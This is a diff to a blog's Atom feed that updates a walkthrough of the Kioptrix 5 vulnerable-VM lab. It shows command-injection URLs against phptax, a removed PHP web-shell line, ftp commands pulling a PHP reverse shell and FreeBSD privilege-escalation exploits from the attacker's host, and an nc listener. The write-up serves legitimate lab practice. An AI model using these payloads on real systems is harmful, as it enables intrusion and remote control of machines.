@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-07T16:40:00-05:00</updated>
+  <updated>2016-07-11T13:30:50-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -23,9 +23,17 @@
 <ul>
 <li>netdiscover</li>
 <li>Nmap</li>
-<li>nikto</li>
+<li>Nikto</li>
+<li>User Agent Switcher</li>
 </ul>
 
+
+<p> Vulnerability:</p>
+
+<p> <a href="https://www.exploit-db.com/exploits/21665/">phptax 0.8 - Remote Code Execution Vulnerability</a>
+ <a href="https://www.exploit-db.com/exploits/31173/">pChart2.1.3 Directory Traversal Vulnerability</a>
+ <a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a>
+ <a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></p>
 
 <!--more-->
 
@@ -102,9 +110,50 @@
 
 <p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix5/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>upload php shell:</p>
+<p>Here I tired to wget the php shell from my http server didn&rsquo;t work. I also tried to write php shell to a php file driectly, also failed. Now I use ftp to upload my shell:</p>
 
-<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob; echo '&lt;?php system($_GET["exec"]); ?&gt;' &gt; shell.php&amp;pdf=make</code></p>
+<p>check if ftp is availabe:</p>
+
+<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;which ftp &gt;test1.txt; &amp;pdf=make</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix5/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>php reverse shell:</p>
+
+<p><code>/usr/share/webshells/php/php-reverse-shell.php</code></p>
+
+<p>change the IP address:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix5/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>upload the shell using <a href="ftp:">ftp:</a></p>
+
+<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;ftp -4 -d -v ftp://bobftpusername:bobftppassword@192.168.79.173//reverse.php; &amp;pdf=make</code></p>
+
+<p>set up nc listener</p>
+
+<p>get the shell:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix5/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the kernel version</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix5/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Its FreeBSD 9.0-RELEASE, <code>searchsploit freebsd 9.0</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix5/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>copy these two exploits to /ftphome/</p>
+
+<p>download them to the target:</p>
+
+<p><code>ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//26368.c</code>
+<code>ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//28718.c</code></p>
+
+<p>get the F***ing root:</p>
+
+<p><code>&lt;img src="http://wg135.github.io/images/blog/vulhub/kioptrix5/Selection_017.png" title="[title manually exploit [alt text]]" &gt;</code></p>
 ]]></content>
   </entry>
   
